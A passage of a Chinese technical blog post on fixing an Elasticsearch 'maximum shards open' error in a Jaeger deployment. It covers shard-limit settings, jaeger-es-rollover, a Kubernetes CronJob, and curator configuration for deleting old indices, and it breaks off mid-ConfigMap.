&lt;p>this action would add [x] total shards, but this cluster currently has [y]/[z] maximum shards open;&lt;/p>
&lt;p>The &lt;a class="link" href="https://www.elastic.co/guide/en/elasticsearch/reference/8.1/modules-cluster.html#cluster-max-shards-per-node" target="_blank" rel="noopener"
>&lt;code>cluster.max_shards_per_node&lt;/code>&lt;/a> cluster setting limits the maximum number of open shards for a cluster. This error indicates an action would exceed this limit.&lt;/p>
&lt;/blockquote>
&lt;p>&lt;code>max_shards_per_node&lt;/code>的文档也很怪：&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>&lt;code>cluster.max_shards_per_node&lt;/code>&lt;/strong>&lt;/p>
&lt;p>(&lt;a class="link" href="https://www.elastic.co/guide/en/elasticsearch/reference/8.1/settings.html#dynamic-cluster-setting" target="_blank" rel="noopener"
>Dynamic&lt;/a>) Limits the total number of primary and replica shards for the cluster. Elasticsearch calculates the limit as follows:&lt;/p>
&lt;pre>&lt;code>cluster.max_shards_per_node * number of non-frozen data nodes
&lt;/code>&lt;/pre>&lt;p>Shards for closed indices do not count toward this limit. Defaults to &lt;code>1000&lt;/code>. A cluster with no data nodes is unlimited.&lt;/p>
&lt;/blockquote>
&lt;p>虽然字面上看就是一个节点可以assign的分片数量，但实际算的是 &lt;code>total number of primary and replica shards for cluster&lt;/code>。可以简单算一下，单节点集群显然只有一个 &lt;code>non-frozen data node&lt;/code>，所以集群的分片上限就是 &lt;code>1000 * 1&lt;/code>。线上的 3 节点集群没有 &lt;code>frozen data node&lt;/code>，所以全集群最多有 &lt;code>1000*3&lt;/code> 个分片。&lt;/p>
&lt;p>好了问题来了，&lt;code>max_shards_per_node&lt;/code> 和 &lt;code>total_shards_per_node&lt;/code> 有啥区别？&lt;/p>
&lt;p>&lt;code>total_shards_per_node&lt;/code> 限制的是 &lt;strong>一个节点能分配多少分片&lt;/strong>，&lt;code>max_shards_per_node&lt;/code> 是 &lt;strong>计算全集群能分配多少分片&lt;/strong> 。&lt;/p>
&lt;p>例如一个三节点集群里，&lt;code>total_shards_per_node&lt;/code> 是 &lt;code>100&lt;/code>，但 &lt;code>max_shards_per_node&lt;/code> 是 &lt;code>1000&lt;/code>，可以创建出超过&lt;code>100&lt;/code>个分片，但超出的分片不会被分配（没有实验过，我猜是不会 assign）。&lt;/p>
&lt;p>反过来说 &lt;code>total_shards_per_node&lt;/code> 比 &lt;code>max_shards_per_node&lt;/code> 大的时候，虽然节点还能分配更多分片，但集群分片数已经到上限了，就会出现 &lt;code>this action would add [x] total shards, but this cluster currently has [y]/[z] maximum shards open;&lt;/code> 错误了。&lt;/p>
&lt;h2 id="处理">处理&lt;/h2>
&lt;p>总的来说，既然是集群内的 &lt;code>max_shards_per_node&lt;/code> 配置小了，解决方法就很多：&lt;/p>
&lt;ol>
&lt;li>把 &lt;code>max_shards_per_node&lt;/code> 调大，比如&lt;code>10000&lt;/code>，直接10倍。&lt;/li>
&lt;li>加 es 服务节点。&lt;/li>
&lt;li>删旧的 jaeger 索引。&lt;/li>
&lt;/ol>
&lt;p>改配置显然是有点离谱的想法，等于是看到蟑螂在脚下，你选择铺张地毯，眼不见心不烦。&lt;/p>
&lt;p>加节点只适合不差钱的公司，而且这么选多少是有点看公司人傻钱多的意思。&lt;/p>
&lt;p>删除旧索引就正常很多，算是经典操作。更早些年应该还有个人站长写 crontab 自动删 &lt;code>/var/log&lt;/code> 日志的，删旧索引本质差不多就是这个意思。&lt;/p>
&lt;p>而清理旧索引也有很多做法。&lt;/p>
&lt;h3 id="jaeger-es-rollover">jaeger-es-rollover&lt;/h3>
&lt;h4 id="初始化">初始化&lt;/h4>
&lt;p>&lt;strong>注意，我无法确定是否对未启用&lt;code>--es.use-aliases&lt;/code>时创建的索引有效。&lt;/strong>&lt;/p>
&lt;p>&lt;strong>注意，rollover init 也会创建索引和分片，如果你已经碰到了上面的问题，直接 rollover init 会失败，必须先手动清理。&lt;/strong>&lt;/p>
&lt;p>&lt;strong>如果只想看如何清理旧索引，请跳到 删除 部分，还不行就跳到 curator 小节。&lt;/strong>&lt;/p>
&lt;p>search indices 一节所述，可以使用 jaeger-es-rollover 解决以 es 作为后端存储时的 jaeger 日志轮转问题。我要吐槽下，原文：&lt;/p>
&lt;p>参考 &lt;a class="link" href="https://www.jaegertracing.io/docs/1.32/deployment/#shards-and-replicas-for-elasticsearch-indices" target="_blank" rel="noopener"
>jaeger 部署文档中 shards and replicas for elasticsearch indices 一节所述&lt;/a>，可以使用 &lt;code>jaeger-es-rollover&lt;/code> 解决以 es 作为后端存储时的 jaeger 日志轮转问题。我要吐槽下，原文：&lt;/p>
&lt;blockquote>
&lt;p>Shards and replicas are some configuration values to take special attention to, because this is decided upon index creation. &lt;a class="link" href="https://qbox.io/blog/optimizing-elasticsearch-how-many-shards-per-index" target="_blank" rel="noopener"
>This article&lt;/a> goes into more information about choosing how many shards should be chosen for optimization.&lt;/p>
&lt;/blockquote>
&lt;p>没有任何未配置 es 日志轮转可能产生的问题的警告。我怎么知道&lt;code>take special attention to&lt;/code>是指性能会在特定条件下拉胯，还是直接把 es 服务的 shards 占满，直接搞得 es 没法服务？&lt;code>This article&lt;/code> 这个链接更离谱了，半句没提为什么后面有个 &lt;code>elasticsearch rollover&lt;/code> 小结。&lt;/p>
&lt;p>好闲话少叙。我这里是 kubernetes 平台，docker-compose 用户或者真机部署的自己看着改。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">kubectl create job --image jaegertracing/jaeger-es-rollover:latest jaeger-es-rollover-init -- /go/bin/es-rollover init http://elasticsearch-es-http.elasticsearch.svc.cluster.local:9200 --es.username&lt;span class="o">=&lt;/span>***censored*** --es.password&lt;span class="o">=&lt;/span>***censored***
&lt;/code>&lt;/pre>&lt;/div>&lt;p>换成 docker 命令就是&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">docker run -it --rm --net&lt;span class="o">=&lt;/span>host jaegertracing/jaeger-es-rollover:latest init http://localhost:9200 --es.username&lt;span class="o">=&lt;/span>***censored*** --es.password&lt;span class="o">=&lt;/span>***censored***
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这一步会创建几个新的 index 和别名&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/jaeger-with-es-backend-exceeded-maximum-shards-open/image-20220413141559066.png"
width="1842"
height="378"
srcset="https://nnnewb.github.io/blog/blog/p/jaeger-with-es-backend-exceeded-maximum-shards-open/image-20220413141559066_huf31b44a88e85ce036ecd9f25c7699fa0_33804_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/jaeger-with-es-backend-exceeded-maximum-shards-open/image-20220413141559066_huf31b44a88e85ce036ecd9f25c7699fa0_33804_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="rollover init后"
class="gallery-image"
data-flex-grow="487"
data-flex-basis="1169px"
>&lt;/p>
&lt;p>注意图中标记的部分。&lt;/p>
&lt;p>下一步修改 jaeger 的启动参数，我这里直接 &lt;code>kubectl edit -n jaeger deployment jaeger&lt;/code> 编辑。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/jaeger-with-es-backend-exceeded-maximum-shards-open/image-20220413141913088.png"
width="885"
height="169"
srcset="https://nnnewb.github.io/blog/blog/p/jaeger-with-es-backend-exceeded-maximum-shards-open/image-20220413141913088_hu4a18394a943caa248bfd6f08f6042657_22472_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/jaeger-with-es-backend-exceeded-maximum-shards-open/image-20220413141913088_hu4a18394a943caa248bfd6f08f6042657_22472_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="启动参数"
class="gallery-image"
data-flex-grow="523"
data-flex-basis="1256px"
>&lt;/p>
&lt;p>应用后自动更新 pod，注意看下日志有没有错误或者警告。对于 docker-compose 用户改法差不多，如果 jaeger 是直接 &lt;code>docker run&lt;/code> 起来的，那是真的牛啤。自己 &lt;code>docker rm&lt;/code> 再 &lt;code>docker run&lt;/code> 一次吧。真机部署 jaeger 还没见过直接略，无非是改 systemd 配置或者 /etc/init.d 。&lt;/p>
&lt;p>到这里 jaeger 部署的调整就完了，但问题还没解决：要是时间久了，会不会还创建一堆 indices？据我观察，应该不会再每天 2 个 index 的频率高强度创建 index 了（PS：因为第一天动手的时候没注意，jaeger 没加 &lt;code>--es.use-aliases=true&lt;/code>，所以我也不敢说绝对不会，建议自己改了第二天看一眼。），新的 index 会写入到之前看到的 &lt;code>jaeger-span-000001&lt;/code> 这种 index 里。&lt;/p>
&lt;p>文档里给了个从每日创建索引转到 rollover 的迁移方法：&lt;/p>
&lt;p>&lt;strong>这不会删除旧索引，只是把旧索引合并到了别名&lt;code>jaeger-*-read&lt;/code>里，让 jaeger 能查询到旧的日志。&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">curl -ivX POST -H &lt;span class="s2">&amp;#34;Content-Type: application/json&amp;#34;&lt;/span> localhost:9200/_aliases -d &lt;span class="s1">&amp;#39;{&amp;#34;actions&amp;#34; : [{ &amp;#34;add&amp;#34; : { &amp;#34;index&amp;#34; : &amp;#34;jaeger-span-*-*-*&amp;#34;, &amp;#34;alias&amp;#34; : &amp;#34;jaeger-span-read&amp;#34; } }, { &amp;#34;add&amp;#34; : { &amp;#34;index&amp;#34;:&amp;#34;jaeger-service-*-*-*&amp;#34;, &amp;#34;alias&amp;#34; : &amp;#34;jaeger-service-read&amp;#34; }}]}&amp;#39;&lt;/span>
&lt;span class="c1"># archive indices&lt;/span>
curl -ivX POST -H &lt;span class="s2">&amp;#34;Content-Type: application/json&amp;#34;&lt;/span> localhost:9200/_aliases -d &lt;span class="s1">&amp;#39;{&amp;#34;actions&amp;#34; : [{ &amp;#34;add&amp;#34; : { &amp;#34;index&amp;#34; : &amp;#34;jaeger-span-archive&amp;#34;, &amp;#34;alias&amp;#34; : &amp;#34;jaeger-span-archive-read&amp;#34; } }]}&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意如果有归档的话用 第二条 curl 的同时还要给 &lt;code>jaeger&lt;/code> 加上启动参数&lt;code>--es.archive.use-aliases=true&lt;/code>。&lt;/p>
&lt;h4 id="轮转">轮转&lt;/h4>
&lt;p>到这里，问题解决了90%，但还有个问题：如果所有 jaeger 数据都放在一个 index 里，过上一段时间，数据量膨胀后会不会产生性能问题？这是很自然的想法，日志这种东西是很容易膨胀的，随时间流逝很可能堆成一座难以清理的大山：就像是你想在MySQL里往一个记录超亿级的表里插数据或删数据一样。&lt;/p>
&lt;p>&lt;code>jaeger-es-rollover&lt;/code> 真正的用途就是这个：轮转日志。一个 index 已经有 100M 了，那就换一个 index 吧。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="c1"># 按 CONDITIONS 指定的规则轮转&lt;/span>
docker run -it --rm --net&lt;span class="o">=&lt;/span>host -e &lt;span class="nv">CONDITIONS&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;{&amp;#34;max_age&amp;#34;: &amp;#34;1s&amp;#34;}&amp;#39;&lt;/span> jaegertracing/jaeger-es-rollover:latest rollover http://localhost:9200
&lt;/code>&lt;/pre>&lt;/div>&lt;blockquote>
&lt;p>Rollover lets you configure when to roll over to a new index based on one or more of the following criteria:&lt;/p>
&lt;ul>
&lt;li>&lt;code>max_age&lt;/code> - the maximum age of the index. It uses &lt;a class="link" href="https://www.elastic.co/guide/en/elasticsearch/reference/master/common-options.html#time-units" target="_blank" rel="noopener"
>time units&lt;/a>: &lt;code>d&lt;/code>, &lt;code>h&lt;/code>, &lt;code>m&lt;/code>.&lt;/li>
&lt;li>&lt;code>max_docs&lt;/code> - the maximum documents in the index.&lt;/li>
&lt;li>&lt;code>max_size&lt;/code> - the maximum estimated size of primary shards (since Elasticsearch 6.x). It uses &lt;a class="link" href="https://www.elastic.co/guide/en/elasticsearch/reference/master/common-options.html#byte-units" target="_blank" rel="noopener"
>byte size units&lt;/a> &lt;code>tb&lt;/code>, &lt;code>gb&lt;/code>, &lt;code>mb&lt;/code>.&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;p>目前支持的条件就只有这些。rollover 并不能让 es &lt;em>替你&lt;/em> 轮转索引，所以这个 rollover 命令只能自己定时执行。&lt;/p>
&lt;p>对于 docker-compose 用户或者 docker 用户我没啥好办法，也许你可以在宿主机里写一个 crontab 跑上面的&lt;code>docker run&lt;/code>。&lt;/p>
&lt;p>对于我这样的 kubernetes 用户则可以选择用 kubernetes 的 cronjob 实现。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nt">apiVersion&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">batch/v1beta1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># 对于 kubernetes v1.21.x 已经不是 beta 了，改成 batch/v1&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">kind&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">CronJob&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">metadata&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">jaeger-es-index-rollover&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">namespace&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">jaeger&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">spec&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">schedule&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;0 0 * * 0&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">jobTemplate&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">spec&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">template&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">spec&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">containers&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># see document https://www.jaegertracing.io/docs/1.32/deployment/#remove-old-data&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">image&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">jaegertracing/jaeger-es-rollover:latest&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">jaeger-es-rollover&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">env&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">CONDITIONS&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">value&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;{&amp;#34;max_age&amp;#34;:&amp;#34;2d&amp;#34;}&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">args&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">rollover&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- --&lt;span class="l">es.username=***censored***&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- --&lt;span class="l">es.password=***censored***&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="s2">&amp;#34;http://elasticsearch-es-http.elasticsearch.svc.cluster.local:9200&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">resources&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">requests&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">cpu&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">100m&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">memory&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">100Mi&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">limits&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">cpu&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">100m&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">memory&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">100Mi&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">restartPolicy&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Never&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>好，问题解决99%了！&lt;/p>
&lt;h4 id="删除">删除&lt;/h4>
&lt;p>最后就是删除不再需要的数据了，很简单啦。下面的命令中 &lt;code>14&lt;/code> 表示保留最近14天的日志，同样支持 &lt;code>--es.username&lt;/code>和&lt;code>--es.password&lt;/code>参数。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">docker run -it --rm --net&lt;span class="o">=&lt;/span>host -e &lt;span class="nv">ROLLOVER&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nb">true&lt;/span> jaegertracing/jaeger-es-index-cleaner:latest &lt;span class="m">14&lt;/span> http://localhost:9200
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>注意，虽然文档说 &lt;em>that is also used for daily indices&lt;/em>，但实际发现好像并不会删。&lt;/strong>&lt;/p>
&lt;p>我不确定是不是 &lt;strong>ROLLOVER&lt;/strong> 这个环境变量的影响，建议自己试试。&lt;/p>
&lt;h3 id="elasticsearch-curator">elasticsearch-curator&lt;/h3>
&lt;p>好了，奇技淫巧环节。&lt;a class="link" href="https://github.com/elastic/curator" target="_blank" rel="noopener"
>curator&lt;/a> 是一个 elastic 公司开源的 python 包，介绍比较皮：&lt;/p>
&lt;blockquote>
&lt;p>Have indices in Elasticsearch? This is the tool for you!&lt;/p>
&lt;p>Like a museum curator manages the exhibits and collections on display, Elasticsearch Curator helps you curate, or manage your indices.&lt;/p>
&lt;/blockquote>
&lt;p>对不起，没去过博物馆，也没做过馆长，Get 不到。&lt;/p>
&lt;p>简单地说，curator 是一个 indice 管理的工具，我们用这个工具实现找到旧索引并删除。&lt;/p>
&lt;p>curator 的命令行界面像这样：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">Usage: curator [OPTIONS] ACTION_FILE
Curator for Elasticsearch indices.
See http://elastic.co/guide/en/elasticsearch/client/curator/current
Options:
--config PATH Path to configuration file. Default: ~/.curator/curator.yml
--dry-run Do not perform any changes.
--version Show the version and exit.
--help Show this message and exit.
&lt;/code>&lt;/pre>&lt;/div>&lt;p>关于这个工具，我们主要关注官方文档里的两个部分：&lt;a class="link" href="https://www.elastic.co/guide/en/elasticsearch/client/curator/current/configfile.html" target="_blank" rel="noopener"
>configuration file&lt;/a> 和 &lt;a class="link" href="https://www.elastic.co/guide/en/elasticsearch/client/curator/current/actionfile.html" target="_blank" rel="noopener"
>action file&lt;/a>。&lt;/p>
&lt;p>configuration file 保存的是关于连接 es 所需的配置如地址、用户名密码、验证方法等，以及工具本身的配置如日志。&lt;/p>
&lt;p>action file 保存的是我们希望 curator 帮我们完成的操作。&lt;/p>
&lt;p>action file 的格式如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nt">actions&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">action&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">ACTION1&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">description&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">OPTIONAL DESCRIPTION&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">options&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">option1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">value1&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">...&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">filters&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">filtertype&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="cp">*first*&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">filter_element1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">value1&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">...&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">2&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">...&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>其中 &lt;code>action&lt;/code> 是我们希望 curator 做的事，&lt;code>options&lt;/code> 和 &lt;code>filters&lt;/code> 控制 &lt;code>action&lt;/code> 的行为和行为的对象。&lt;code>action&lt;/code>支持&lt;a class="link" href="https://www.elastic.co/guide/en/elasticsearch/client/curator/current/actions.html" target="_blank" rel="noopener"
>很多不同的操作&lt;/a>。&lt;/p>
&lt;p>好了，现在看实例。我们想删除名称符合 &lt;code>jaeger-span-yyyy-mm-dd&lt;/code> 格式的 index，并且&lt;code>yyyy-mm-dd&lt;/code>小于指定的日期。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="w"> &lt;/span>&lt;span class="nt">actions&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">action&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">delete_indices&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">description&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">&amp;gt;-&lt;/span>&lt;span class="sd">
&lt;/span>&lt;span class="sd"> &lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">delete old jaeger-span indices&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">options&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">ignore_empty_list&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">timeout_override&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">continue_if_exception&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">disable_action&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">False&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">filters&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">filtertype&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">pattern&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">kind&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">prefix&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">value&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">jaeger-span&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">exclude&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">filtertype&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">age&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">source&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">name&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">direction&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">older&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">timestring&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;%Y-%m-%d&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">unit&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">days&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">unit_count&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="m">7&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">exclude&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>动作：&lt;code>delete_indices&lt;/code>；忽略空输入，即使异常也继续执行；要删除的对象以 &lt;code>jaeger-span&lt;/code> 开头，并且名称包含 &lt;code>%Y-%m-%d&lt;/code> 模式的日期，且早于 7 天前。&lt;/p>
&lt;p>done！把上面的配置复制一份套用到 &lt;code>jaeger-service-yyyy-mm-dd&lt;/code> 上，删除 jaeger-span 的任务就算配置好了。&lt;/p>
&lt;p>接下来把删除工作配置成定时任务，这里还是用了 cronjob。&lt;/p>
&lt;p>先把配置保存成 ConfigMap。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nn">---&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># https://kubernetes.io/docs/concepts/configuration/configmap/&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">kind&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">ConfigMap&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">apiVersion&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">v1&lt;/span>&lt;span class="w">
